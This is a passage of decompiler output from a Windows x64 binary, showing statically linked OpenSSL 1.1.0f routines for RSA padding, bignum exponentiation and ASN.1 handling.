      sub_140020670(*(_QWORD **)(v2 + 40));
      sub_14001B4E0(*(void **)(v2 + 48));
    }
    return 1i64;
  }
  return result;
}

//----- (00000001400809C0) ----------------------------------------------------
void *sub_1400809C0()
{
  return &unk_140110E30;
}

//----- (00000001400809D0) ----------------------------------------------------
void *sub_1400809D0()
{
  return &unk_140111000;
}

//----- (00000001400809E0) ----------------------------------------------------
void *sub_1400809E0()
{
  return &unk_14010FFF0;
}

//----- (00000001400809F0) ----------------------------------------------------
__int64 __fastcall sub_1400809F0(unsigned __int8 **a1, __int64 a2, __int64 a3, int a4)
{
  int v4; // r9d
  int v6[2]; // [rsp+20h] [rbp-38h] BYREF
  char *v7; // [rsp+28h] [rbp-30h]
  int v8; // [rsp+30h] [rbp-28h]
  __int64 v9[4]; // [rsp+38h] [rbp-20h] BYREF
  char v10; // [rsp+78h] [rbp+20h] BYREF
  char v11; // [rsp+79h] [rbp+21h]
  char v12; // [rsp+7Ah] [rbp+22h]
  char v13; // [rsp+7Bh] [rbp+23h]

  v4 = 8 * a4;
  v9[0] = a2;
  v10 = HIBYTE(v4);
  v9[1] = a3;
  v11 = BYTE2(v4);
  v12 = BYTE1(v4);
  v7 = &v10;
  v9[2] = (__int64)v6;
  v13 = v4;
  v6[0] = 4;
  v6[1] = 4;
  v8 = 0;
  return sub_1400536F0((unsigned int *)v9, a1, (__int64)&unk_140110280);
}

//----- (0000000140080A80) ----------------------------------------------------
__int64 __fastcall sub_140080A80(__int64 a1, __int64 a2)
{
  int v2; // ebx
  unsigned int v5; // edi
  __int64 i; // rsi
  __int64 v8; // rdx
  char v9; // [rsp+48h] [rbp+10h] BYREF
  char v10; // [rsp+49h] [rbp+11h]

  v2 = 0;
  v5 = 0;
  if ( !a2 )
    return 0i64;
  if ( (*(_DWORD *)(a2 + 4) & 0x100) != 0 )
  {
    v5 = 1;
    if ( (unsigned int)sub_14002A430(a1, (__int64)"-", 1u) != 1 )
      return 0xFFFFFFFFi64;
  }
  if ( *(_DWORD *)a2 )
  {
    if ( *(int *)a2 <= 0 )
      return v5;
    for ( i = 0i64; ; ++i )
    {
      if ( v2 && v2 == 35 * (v2 / 35) )
      {
        if ( (unsigned int)sub_14002A430(a1, (__int64)"\\\n", 2u) != 2 )
          return 0xFFFFFFFFi64;
        v5 += 2;
      }
      v8 = *(_QWORD *)(a2 + 8);
      v9 = off_14013D018[(unsigned __int64)*(unsigned __int8 *)(v8 + i) >> 4];
      v10 = off_14013D018[*(_BYTE *)(v8 + i) & 0xF];
      if ( (unsigned int)sub_14002A430(a1, (__int64)&v9, 2u) != 2 )
        break;
      v5 += 2;
      if ( ++v2 >= *(_DWORD *)a2 )
        return v5;
    }
    return 0xFFFFFFFFi64;
  }
  if ( (unsigned int)sub_14002A430(a1, (__int64)"00", 2u) != 2 )
    return 0xFFFFFFFFi64;
  v5 += 2;
  return v5;
}
// 14013D018: using guessed type char *off_14013D018;

//----- (0000000140080BC0) ----------------------------------------------------
__int64 __fastcall sub_140080BC0(int a1, __int64 *a2)
{
  __int64 v3; // rax
  __int64 result; // rax

  if ( a1 )
  {
    if ( a1 == 2 )
    {
      sub_14002CEF0(*a2);
      result = 2i64;
      *a2 = 0i64;
    }
    else
    {
      return 1i64;
    }
  }
  else
  {
    v3 = sub_14002D050();
    *a2 = v3;
    return v3 != 0 ? 2 : 0;
  }
  return result;
}

//----- (0000000140080C20) ----------------------------------------------------
void __fastcall sub_140080C20(unsigned int *a1)
{
  sub_140051250(a1, (__int64)&unk_140111900);
}

//----- (0000000140080C40) ----------------------------------------------------
void *sub_140080C40()
{
  return &unk_140111900;
}

//----- (0000000140080C50) ----------------------------------------------------
__int64 sub_140080C50()
{
  return sub_140050B70((__int64)&unk_140111900);
}

//----- (0000000140080C70) ----------------------------------------------------
void __fastcall sub_140080C70(unsigned int *a1)
{
  sub_140051250(a1, (__int64)&unk_140111BC0);
}

//----- (0000000140080C90) ----------------------------------------------------
void *sub_140080C90()
{
  return &unk_140111BC0;
}

//----- (0000000140080CA0) ----------------------------------------------------
__int64 sub_140080CA0()
{
  return sub_140050B70((__int64)&unk_140111BC0);
}

//----- (0000000140080CC0) ----------------------------------------------------
__int64 __fastcall sub_140080CC0(__int64 *a1, char **a2, __int64 a3)
{
  return sub_1400516D0(a1, a2, a3, (__int64)&unk_140111AA0);
}

//----- (0000000140080CE0) ----------------------------------------------------
__int64 __fastcall sub_140080CE0(__int64 *a1, char **a2, __int64 a3)
{
  return sub_1400516D0(a1, a2, a3, (__int64)&unk_140111B10);
}

//----- (0000000140080D00) ----------------------------------------------------
__int64 __fastcall sub_140080D00(unsigned int *a1, unsigned __int8 **a2)
{
  return sub_1400536F0(a1, a2, (__int64)&unk_140111AA0);
}

//----- (0000000140080D20) ----------------------------------------------------
__int64 __fastcall sub_140080D20(unsigned int *a1, unsigned __int8 **a2)
{
  return sub_1400536F0(a1, a2, (__int64)&unk_140111B10);
}

//----- (0000000140080D40) ----------------------------------------------------
__int64 __fastcall sub_140080D40(_BYTE *a1, int a2, const void *a3, unsigned int a4)
{
  size_t v4; // rsi
  size_t v7; // rbx
  _BYTE *v8; // rdi

  v4 = a4;
  if ( (int)a4 <= a2 - 11 )
  {
    *a1 = 0;
    v7 = (int)(a2 - a4 - 3);
    v8 = a1 + 1;
    a1[1] = 1;
    memset(a1 + 2, 255, v7);
    v8[v7 + 1] = 0;
    memmove(&v8[v7 + 2], a3, v4);
    return 1i64;
  }
  else
  {
    sub_140024610(4, 108, 110, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pk1.c", 26);
    return 0i64;
  }
}

//----- (0000000140080DF0) ----------------------------------------------------
__int64 __fastcall sub_140080DF0(_BYTE *a1, int a2, const void *a3, unsigned int a4)
{
  size_t v4; // rbp
  signed int v7; // esi
  _BYTE *v8; // rbx
  int v9; // edi

  v4 = a4;
  if ( (int)a4 <= a2 - 11 )
  {
    *a1 = 0;
    v7 = a2 - a4 - 3;
    a1[1] = 2;
    v8 = a1 + 2;
    if ( (int)sub_140025460((__int64)(a1 + 2), v7) > 0 )
    {
      v9 = 0;
      if ( v7 <= 0 )
      {
LABEL_10:
        *v8 = 0;
        memmove(v8 + 1, a3, v4);
        return 1i64;
      }
      else
      {
        while ( *v8 )
        {
LABEL_9:
          ++v8;
          if ( ++v9 >= v7 )
            goto LABEL_10;
        }
        while ( (int)sub_140025460((__int64)v8, 1u) > 0 )
        {
          if ( *v8 )
            goto LABEL_9;
        }
        return 0i64;
      }
    }
    else
    {
      return 0i64;
    }
  }
  else
  {
    sub_140024610(4, 109, 110, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pk1.c", 125);
    return 0i64;
  }
}

//----- (0000000140080EF0) ----------------------------------------------------
__int64 __fastcall sub_140080EF0(void *a1, int a2, char *a3, int a4, int a5)
{
  char *v5; // r10
  char v8; // al
  _BYTE *v9; // r10
  int v10; // ecx
  int v11; // ebx
  unsigned int v12; // ebx

  v5 = a3;
  if ( a5 < 11 )
    return 0xFFFFFFFFi64;
  if ( a5 == a4 )
  {
    v5 = a3 + 1;
    if ( *a3 )
    {
      sub_140024610(4, 112, 138, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pk1.c", 67);
      return 0xFFFFFFFFi64;
    }
    --a4;
  }
  if ( a5 == a4 + 1 && (v8 = *v5, v9 = v5 + 1, v8 == 1) )
  {
    v10 = 0;
    v11 = a4 - 1;
    if ( a4 - 1 > 0 )
    {
      while ( *v9 == 0xFF )
      {
        ++v9;
        if ( ++v10 >= v11 )
          goto LABEL_12;
      }
      if ( *v9 )
      {
        sub_140024610(4, 112, 102, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pk1.c", 88);
        return 0xFFFFFFFFi64;
      }
      ++v9;
    }
LABEL_12:
    if ( v10 == v11 )
    {
      sub_140024610(4, 112, 113, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pk1.c", 97);
      return 0xFFFFFFFFi64;
    }
    else if ( v10 >= 8 )
    {
      v12 = -1 - v10 + v11;
      if ( (int)v12 <= a2 )
      {
        memmove(a1, v9, v12);
        return v12;
      }
      else
      {
        sub_140024610(4, 112, 109, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pk1.c", 109);
        return 0xFFFFFFFFi64;
      }
    }
    else
    {
      sub_140024610(4, 112, 103, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pk1.c", 103);
      return 0xFFFFFFFFi64;
    }
  }
  else
  {
    sub_140024610(4, 112, 106, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pk1.c", 75);
    return 0xFFFFFFFFi64;
  }
}

//----- (00000001400810A0) ----------------------------------------------------
__int64 __fastcall sub_1400810A0(void *a1, int a2, const void *a3, int a4, int a5)
{
  int v5; // edi
  size_t v6; // r14
  int v7; // ebx
  unsigned __int8 *v11; // rbp
  unsigned __int8 *v12; // rax
  int v14; // r8d
  int v15; // r10d
  unsigned __int8 *v16; // r9
  int v17; // eax
  unsigned int v18; // edx
  int v19; // ecx
  int v20; // eax
  int v21; // ecx

  v5 = 0;
  v6 = a4;
  v7 = -1;
  v11 = 0i64;
  if ( a2 < 0 || a4 < 0 )
    return 0xFFFFFFFFi64;
  if ( a4 <= a5 && a5 >= 11 )
  {
    v12 = (unsigned __int8 *)sub_14001DC20(a5);
    v11 = v12;
    if ( !v12 )
    {
      sub_140024610(4, 113, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pk1.c", 180);
      return 0xFFFFFFFFi64;
    }
    memmove(&v12[a5 - v6], a3, v6);
    v14 = 2;
    v15 = 0;
    v16 = v11 + 2;
    do
    {
      v17 = *v16++;
      v18 = -((v17 >= 0) & ((unsigned int)(v17 - 1) >> 31));
      v19 = v18 & ~v15;
      v15 |= v18;
      v20 = v19;
      v21 = v14++ & v19;
      v5 = v21 | ~v20 & v5;
    }
    while ( v14 < a5 );
    v7 = a5 - (v5 + 1);
    if ( ((((v5 ^ (v5 | (unsigned int)(v5 - 10))) >> 31) - 1) & (((a2 ^ (a2 ^ v7 | v7 ^ (unsigned int)(a2 - v7))) >> 31)
                                                               - 1) & -(((unsigned int)*v11 - 1) >> 31) & -(((v11[1] ^ 2u) - 1) >> 31)) != 0 )
      memmove(a1, &v11[v5 + 1], v7);
    else
      v7 = -1;
  }
  sub_14001D930(v11);
  if ( v7 == -1 )
    sub_140024610(4, 113, 159, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pk1.c", 243);
  return (unsigned int)v7;
}
// 1400811AF: conditional instruction was optimized away because esi.4>=B

//----- (0000000140081290) ----------------------------------------------------
__int64 __fastcall sub_140081290(_BYTE *a1, int a2, const void *a3, unsigned int a4)
{
  size_t v4; // rbp
  signed int v7; // esi
  __int64 v8; // rbx
  int v9; // edi

  v4 = a4;
  if ( (int)a4 <= a2 - 11 )
  {
    *a1 = 0;
    v7 = a2 - a4 - 11;
    a1[1] = 2;
    v8 = (__int64)(a1 + 2);
    if ( (int)sub_140025460((__int64)(a1 + 2), v7) > 0 )
    {
      v9 = 0;
      if ( v7 <= 0 )
      {
LABEL_10:
        *(_QWORD *)v8 = 0x303030303030303i64;
        *(_BYTE *)(v8 + 8) = 0;
        memmove((void *)(v8 + 9), a3, v4);
        return 1i64;
      }
      else
      {
        while ( *(_BYTE *)v8 )
        {
LABEL_9:
          ++v8;
          if ( ++v9 >= v7 )
            goto LABEL_10;
        }
        while ( (int)sub_140025460(v8, 1u) > 0 )
        {
          if ( *(_BYTE *)v8 )
            goto LABEL_9;
        }
        return 0i64;
      }
    }
    else
    {
      return 0i64;
    }
  }
  else
  {
    sub_140024610(4, 110, 110, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ssl.c", 24);
    return 0i64;
  }
}

//----- (00000001400813A0) ----------------------------------------------------
__int64 __fastcall sub_1400813A0(void *a1, int a2, _BYTE *a3, int a4, int a5)
{
  int v5; // eax
  _BYTE *v9; // rdx
  int v10; // ecx
  int i; // ebx
  int v13; // r8d
  __int64 j; // rax
  unsigned int v15; // ebx

  if ( a4 >= 10 )
  {
    if ( a5 == a4 + 1 && (v9 = a3 + 1, *a3 == 2) )
    {
      v10 = 0;
      for ( i = a4 - 1; v10 < i; ++v10 )
      {
        if ( !*v9++ )
          break;
      }
      if ( v10 == i || v10 < 8 )
      {
        sub_140024610(4, 114, 113, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ssl.c", 79);
        return 0xFFFFFFFFi64;
      }
      else
      {
        v13 = -9;
        for ( j = -9i64; j < -1; ++j )
        {
          if ( v9[j] != 3 )
            break;
          ++v13;
        }
        if ( v13 == -1 )
        {
          sub_140024610(4, 114, 115, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ssl.c", 87);
          return 0xFFFFFFFFi64;
        }
        else
        {
          v15 = -1 - v10 + i;
          if ( (int)v15 <= a2 )
          {
            memmove(a1, v9, v15);
            return v15;
          }
          else
          {
            sub_140024610(4, 114, 109, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ssl.c", 94);
            return 0xFFFFFFFFi64;
          }
        }
      }
    }
    else
    {
      sub_140024610(4, 114, 107, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ssl.c", 67);
      return 0xFFFFFFFFi64;
    }
  }
  else
  {
    sub_140024610(v5 - 52, v5 + 58, v5 + 55, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ssl.c", 63);
    return 0xFFFFFFFFi64;
  }
}
// 1400813CB: variable 'v5' is possibly undefined

//----- (0000000140081530) ----------------------------------------------------
__int64 __fastcall sub_140081530(void *a1, int a2, const void *a3, signed int a4)
{
  if ( a4 <= a2 )
  {
    if ( a4 >= a2 )
    {
      memmove(a1, a3, (unsigned int)a4);
      return 1i64;
    }
    else
    {
      sub_140024610(4, 107, 122, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_none.c", 23);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(4, 107, 110, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_none.c", 18);
    return 0i64;
  }
}

//----- (00000001400815B0) ----------------------------------------------------
__int64 __fastcall sub_1400815B0(char *a1, int a2, const void *a3, int a4)
{
  int v4; // eax
  size_t v5; // rdi
  __int64 v7; // rbx

  v5 = a4;
  v7 = a2;
  if ( a4 <= a2 )
  {
    memset(a1, 0, a2 - a4);
    memmove(&a1[v7 - v5], a3, v5);
    return (unsigned int)v7;
  }
  else
  {
    sub_140024610(v4 - 44, v4 + 63, v4 + 61, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_none.c", 36);
    return 0xFFFFFFFFi64;
  }
}
// 1400815EF: variable 'v4' is possibly undefined

//----- (0000000140081640) ----------------------------------------------------
__int64 __fastcall sub_140081640(__int64 a1, __int64 a2, _DWORD *a3)
{
  unsigned int v3; // ebp
  int *v7; // rax
  int *v8; // rsi
  __int64 *v9; // rax
  __int64 *v10; // rdi
  __int64 v11; // r8

  v3 = 0;
  *a3 = 0;
  v7 = (int *)sub_140027CD0();
  v8 = v7;
  if ( v7 )
  {
    sub_140027D40(v7);
    v9 = sub_140027C40(v8);
    v10 = v9;
    if ( !v9 || !(unsigned int)sub_140027560((__int64)v9, 1i64) )
      goto LABEL_15;
    if ( (int)sub_140026AB0(a2, v10) <= 0 )
      *a3 |= 1u;
    if ( !sub_140026E90((__int64)v10, *(_QWORD *)(a1 + 8)) || !(unsigned int)sub_14003E980((__int64)v10, 1ui64) )
      goto LABEL_15;
    if ( (int)sub_140026AB0(a2, v10) >= 0 )
      *a3 |= 2u;
    v11 = *(_QWORD *)(a1 + 64);
    if ( v11 )
    {
      if ( !(unsigned int)sub_14007BD10(v10, a2, v11, *(_QWORD *)(a1 + 8), v8) )
      {
LABEL_15:
        sub_140027B60((__int64)v8);
        sub_140027BE0((__int64)v8);
        return v3;
      }
      if ( !sub_140027110((__int64)v10) )
        *a3 |= 4u;
    }
    v3 = 1;
    goto LABEL_15;
  }
  return v3;
}

//----- (0000000140081760) ----------------------------------------------------
__int64 __fastcall sub_140081760(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        __int64 a5,
        __int64 **a6,
        int *a7,
        __int64 a8)
{
  __int64 *v11; // rax
  int v13; // ebx
  int v14; // eax
  int v15; // edi
  _QWORD *v16; // rax
  __int64 v17; // r12
  _DWORD *v18; // rax
  __int64 v19; // r15
  int v20; // ecx
  unsigned int v21; // r15d
  unsigned int v22; // ebx
  int *v23; // rdi
  unsigned int v24; // ebx
  int *v25; // rbp
  char v26; // cl
  __int64 v27; // rbx
  __int64 v28; // rdi
  _QWORD *v29; // rax
  __int64 v30; // rbx
  __int64 v31; // rdi
  _QWORD *v32; // rax
  int v33; // edi
  int v34; // esi
  int i; // r14d
  int k; // ebp
  void **v37; // rax
  int *v38; // rbx
  int v39; // r13d
  int v40; // r12d
  int v41; // eax
  int j; // ebx
  __int64 v43; // r15
  int m; // ebx
  int v45; // r15d
  int v46; // [rsp+30h] [rbp-2A8h]
  unsigned int v47; // [rsp+30h] [rbp-2A8h]
  __int64 v48; // [rsp+40h] [rbp-298h]
  _QWORD *v49; // [rsp+48h] [rbp-290h]
  int v50; // [rsp+48h] [rbp-290h]
  int v51; // [rsp+50h] [rbp-288h]
  unsigned int v52; // [rsp+50h] [rbp-288h]
  _QWORD *v54; // [rsp+60h] [rbp-278h]
  __int64 v56; // [rsp+78h] [rbp-260h]
  __int64 v57[32]; // [rsp+80h] [rbp-258h]
  __int64 v58[32]; // [rsp+180h] [rbp-158h]

  v11 = *a6;
  v56 = a5;
  v48 = 0i64;
  if ( (*(_BYTE *)v11 & 1) == 0 )
  {
    sub_140024610(3, 118, 102, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_exp2.c", 36);
    return 0i64;
  }
  v13 = sub_140027260(a3);
  v14 = sub_140027260(a5);
  v15 = v14;
  if ( !v13 && !v14 )
    return sub_140027560(a1, 1i64);
  if ( v13 > v14 )
    v14 = v13;
  v51 = v14;
  sub_140027D40(a7);
  v49 = sub_140027C40(a7);
  v54 = sub_140027C40(a7);
  v57[0] = (__int64)sub_140027C40(a7);
  v16 = sub_140027C40(a7);
  v58[0] = (__int64)v16;
  v17 = (__int64)v16;
  if ( !v49 || !v54 || !v57[0] || !v16 )
    goto LABEL_97;
  if ( a8 )
  {
    v48 = a8;
  }
  else
  {
    v18 = sub_14003C400();
    v19 = (__int64)a7;
    v48 = (__int64)v18;
    if ( !v18 )
    {
      v24 = 0;
LABEL_103:
      sub_14003C3A0((__int64)v18);
      goto LABEL_104;
    }
    if ( !(unsigned int)sub_14003C480((__int64)v18, a6, a7) )
    {
      v24 = 0;
LABEL_102:
      v18 = (_DWORD *)v48;
      goto LABEL_103;
    }
  }
  v20 = 1;
  v21 = 6;
  if ( v13 <= 671 )
  {
    if ( v13 <= 239 )
    {
      if ( v13 <= 79 )
      {
        if ( v13 > 23 )
          v20 = 3;
        v46 = v20;
        v22 = v20;
      }
      else
      {
        v22 = 4;
        v46 = 4;
      }
    }
    else
    {
      v22 = 5;
      v46 = 5;
    }
  }
  else
  {
    v22 = 6;
    v46 = 6;
  }
  if ( v15 <= 671 )
  {
    if ( v15 <= 239 )
    {
      if ( v15 <= 79 )
      {
        v21 = 1;
        if ( v15 > 23 )
          v21 = 3;
      }
      else
      {
        v21 = 4;
      }
    }
    else
    {
      v21 = 5;
    }
  }
  if ( *(_DWORD *)(a2 + 16) || (int)sub_140027600((__int64 *)a2, (__int64 *)a6) >= 0 )
  {
    v23 = a7;
    if ( !(unsigned int)sub_140041D70(0i64, v57[0], a2, (__int64)a6, a7) )
      goto LABEL_97;
    a2 = v57[0];
  }
  else
  {
    v23 = a7;
  }
  if ( sub_140027160(a2) )
  {
    sub_140027560(a1, 0i64);
    v24 = 1;
    goto LABEL_98;
  }
  if ( !(unsigned int)sub_1400275D0(v57[0], a2, v48, v23) )
    goto LABEL_97;
  if ( v22 <= 1 )
  {
    v25 = a7;
  }
  else
  {
    if ( !(unsigned int)sub_14003CA60((__int64)v49, v57[0], v57[0], v48, v23) )
      goto LABEL_97;
    v25 = a7;
    v26 = v22 - 1;
    v27 = 1i64;
    v28 = 1 << v26;
    if ( v28 > 1 )
    {
      do
      {
        v29 = sub_140027C40(a7);
        v57[v27] = (__int64)v29;
        if ( !v29 || !(unsigned int)sub_14003CA60((__int64)v29, v57[v27 - 1], (__int64)v49, v48, a7) )
          goto LABEL_97;
      }
      while ( ++v27 < v28 );
    }
  }
  if ( *(_DWORD *)(a4 + 16) || (int)sub_140027600((__int64 *)a4, (__int64 *)a6) >= 0 )
  {
    if ( !(unsigned int)sub_140041D70(0i64, v17, a4, (__int64)a6, v25) )
      goto LABEL_97;
    a4 = v17;
  }
  if ( sub_140027160(a4) )
  {
    sub_140027560(a1, 0i64);
    v24 = 1;
    goto LABEL_98;
  }
  if ( !(unsigned int)sub_1400275D0(v17, a4, v48, v25) )
    goto LABEL_97;
  if ( v21 <= 1 )
    goto LABEL_61;
  if ( !(unsigned int)sub_14003CA60((__int64)v49, v17, v17, v48, v25) )
  {
LABEL_97:
    v24 = 0;
    goto LABEL_98;
  }
  v30 = 1i64;
  v31 = 1 << (v21 - 1);
  if ( v31 > 1 )
  {
    do
    {
      v32 = sub_140027C40(v25);
      v58[v30] = (__int64)v32;
      if ( !v32 || !(unsigned int)sub_14003CA60((__int64)v32, v57[v30 + 31], (__int64)v49, v48, v25) )
        goto LABEL_97;
    }
    while ( ++v30 < v31 );
  }
LABEL_61:
  v50 = 1;
  v33 = 0;
  v34 = 0;
  i = 0;
  k = 0;
  v37 = sub_140027650();
  v38 = a7;
  if ( !(unsigned int)sub_1400275D0((__int64)v54, (__int64)v37, v48, a7) )
    goto LABEL_97;
  v39 = v51 - 1;
  if ( v51 - 1 >= 0 )
  {
    v40 = v51 - 2;
    v52 = v21 - v46;
    v47 = 2 - v21;
    v41 = 1;
    while ( v41 || (unsigned int)sub_14003CA60((__int64)v54, (__int64)v54, (__int64)v54, v48, v38) )
    {
      if ( !v33 && (unsigned int)sub_1400270A0(a3, v39) )
      {
        for ( i = v40 + v52 + v47; !(unsigned int)sub_1400270A0(a3, i); ++i )
          ;
        v33 = 1;
        for ( j = v40; j >= i; --j )
        {
          v33 *= 2;
          if ( (unsigned int)sub_1400270A0(a3, j) )
            ++v33;
        }
      }
      if ( !v34 )
      {
        v43 = v56;
        if ( (unsigned int)sub_1400270A0(v56, v39) )
        {
          for ( k = v40 + v47; !(unsigned int)sub_1400270A0(v43, k); ++k )
            ;
          v34 = 1;
          for ( m = v40; m >= k; --m )
          {
            v34 *= 2;
            if ( (unsigned int)sub_1400270A0(v43, m) )
              ++v34;
          }
        }
      }
      v38 = a7;
      if ( v33 && v39 == i )
      {
        if ( !(unsigned int)sub_14003CA60((__int64)v54, (__int64)v54, v57[(__int64)v33 >> 1], v48, a7) )
          goto LABEL_97;
        v45 = 0;
        v41 = 0;
        v33 = 0;
        v50 = 0;
      }
      else
      {
        v41 = v50;
        v45 = 0;
      }
      if ( v34 && v39 == k )
      {
        if ( !(unsigned int)sub_14003CA60((__int64)v54, (__int64)v54, v58[(__int64)v34 >> 1], v48, a7) )
          goto LABEL_97;
        v41 = 0;
        v34 = 0;
        v50 = 0;
      }
      --v40;
      if ( --v39 < 0 )
        goto LABEL_94;
    }
    goto LABEL_97;
  }
  v45 = 0;
LABEL_94:
  if ( (unsigned int)sub_14003C750(a1, (__int64)v54, v48, v38) )
    v45 = 1;
  v24 = v45;
LABEL_98:
  v19 = (__int64)a7;
  if ( !a8 )
    goto LABEL_102;
LABEL_104:
  sub_140027B60(v19);
  return v24;
}
// 140081760: using guessed type __int64 var_158[32];

//----- (0000000140081E40) ----------------------------------------------------
_DWORD *__fastcall sub_140081E40(_QWORD *a1, __int64 a2, int a3)
{
  _DWORD *result; // rax
  __int64 v7; // rax
  __int64 v8; // rbx
  int *v9; // rcx
  unsigned int v10; // eax
  __int64 v11; // rdx
  unsigned int (__fastcall *v12)(unsigned int *, __int64); // rax
  int v13; // r8d
  int v14; // ecx
  _DWORD *v15; // rax
  unsigned int v16; // [rsp+48h] [rbp+10h] BYREF

  if ( (*(_DWORD *)a2 & 0x300) == 0 )
    return (_DWORD *)a2;
  v7 = (*(__int64 (**)(void))(a2 + 24))();
  v8 = v7;
  v9 = *(int **)(*a1 + *(unsigned int *)(v7 + 4));
  if ( !v9 )
  {
    result = *(_DWORD **)(v7 + 40);
    if ( result )
      return result;
LABEL_17:
    if ( a3 )
      sub_140024610(13, 110, 164, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_utl.c", 238);
    return 0i64;
  }
  if ( (*(_DWORD *)a2 & 0x100) != 0 )
    v10 = sub_14002C260((__int64)v9);
  else
    v10 = sub_14007D9A0(v9);
  v16 = v10;
  v11 = v10;
  v12 = *(unsigned int (__fastcall **)(unsigned int *, __int64))(v8 + 8);
  if ( v12 )
  {
    if ( !v12(&v16, v11) )
    {
      sub_140024610(13, 110, 164, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_utl.c", 213);
      return 0i64;
    }
    LODWORD(v11) = v16;
  }
  v13 = *(_DWORD *)(v8 + 24);
  v14 = 0;
  v15 = *(_DWORD **)(v8 + 16);
  if ( v13 <= 0 )
  {
LABEL_16:
    result = *(_DWORD **)(v8 + 32);
    if ( result )
      return result;
    goto LABEL_17;
  }
  while ( *v15 != (_DWORD)v11 )
  {
    ++v14;
    v15 += 10;
    if ( v14 >= v13 )
      goto LABEL_16;
  }
  return v15 + 2;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140081F50) ----------------------------------------------------
__int64 __fastcall sub_140081F50(_QWORD *a1, int a2, __int64 a3)
{
  __int64 result; // rax
  __int64 v5; // rcx
  _DWORD *v6; // r10
  _DWORD **v7; // rbx
  _DWORD *v8; // rax
  unsigned int v9; // [rsp+50h] [rbp+18h] BYREF

  if ( *(_BYTE *)a3 != 1 && *(_BYTE *)a3 != 6 )
    return 0i64;
  v5 = *(_QWORD *)(a3 + 24);
  if ( !v5 || (*(_BYTE *)(v5 + 8) & 1) == 0 )
    return 0i64;
  v6 = (_DWORD *)(*a1 + *(int *)(v5 + 12));
  v7 = (_DWORD **)(*a1 + *(int *)(v5 + 16));
  if ( a2 )
  {
    if ( (int)sub_140025D60(v6, a2, &v9) < 0 )
      return 0xFFFFFFFFi64;
    result = v9;
    if ( !v9 )
    {
      sub_140025BE0(*v7);
      *v7 = 0i64;
      return v9;
    }
  }
  else
  {
    *v6 = 1;
    v8 = sub_140025C10();
    *v7 = v8;
    if ( !v8 )
    {
      sub_140024610(13, 233, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_utl.c", 74);
      return 0xFFFFFFFFi64;
    }
    return 1i64;
  }
  return result;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140082030) ----------------------------------------------------
void __fastcall sub_140082030(__int64 *a1, __int64 a2)
{
  __int64 v2; // rcx
  __int64 v3; // rax
  __int64 v4; // rbx

  if ( a1 )
  {
    v2 = *a1;
    if ( v2 )
    {
      v3 = *(_QWORD *)(a2 + 24);
      if ( v3 )
      {
        if ( (*(_BYTE *)(v3 + 8) & 2) != 0 )
        {
          v4 = v2 + *(int *)(v3 + 32);
          if ( v4 )
          {
            sub_14001D930(*(void **)v4);
            *(_DWORD *)(v4 + 12) = 1;
            *(_QWORD *)v4 = 0i64;
            *(_DWORD *)(v4 + 8) = 0;
          }
        }
      }
    }
  }
}

//----- (00000001400820A0) ----------------------------------------------------
void __fastcall sub_1400820A0(__int64 *a1, __int64 a2)
{
  __int64 v2; // rcx
  __int64 v3; // rax
  __int64 v4; // rax

  if ( a1 )
  {
    v2 = *a1;
    if ( v2 )
    {
      v3 = *(_QWORD *)(a2 + 24);
      if ( v3 )
      {
        if ( (*(_BYTE *)(v3 + 8) & 2) != 0 )
        {
          v4 = v2 + *(int *)(v3 + 32);
          if ( v4 )
          {
            *(_DWORD *)(v4 + 12) = 1;
            *(_QWORD *)v4 = 0i64;
            *(_DWORD *)(v4 + 8) = 0;
          }
        }
      }
    }
  }
}

//----- (00000001400820E0) ----------------------------------------------------
__int64 __fastcall sub_1400820E0(_DWORD *a1, void **a2, _QWORD *a3, __int64 a4)
{
  __int64 v6; // rax
  __int64 v7; // rbx

  if ( !a3 )
    return 0i64;
  if ( !*a3 )
    return 0i64;
  v6 = *(_QWORD *)(a4 + 24);
  if ( !v6 )
    return 0i64;
  if ( (*(_BYTE *)(v6 + 8) & 2) == 0 )
    return 0i64;
  v7 = *a3 + *(int *)(v6 + 32);
  if ( !v7 || *(_DWORD *)(v7 + 12) )
    return 0i64;
  if ( a2 )
  {
    memmove(*a2, *(const void **)v7, *(int *)(v7 + 8));
    *a2 = (char *)*a2 + *(int *)(v7 + 8);
  }
  if ( a1 )
    *a1 = *(_DWORD *)(v7 + 8);
  return 1i64;
}

//----- (0000000140082180) ----------------------------------------------------
__int64 __fastcall sub_140082180(__int64 *a1, const void *a2, int a3, __int64 a4)
{
  size_t v4; // rdi
  __int64 v6; // rcx
  __int64 v7; // rax
  __int64 v8; // rbx
  __int64 result; // rax

  v4 = a3;
  if ( !a1 )
    return 1i64;
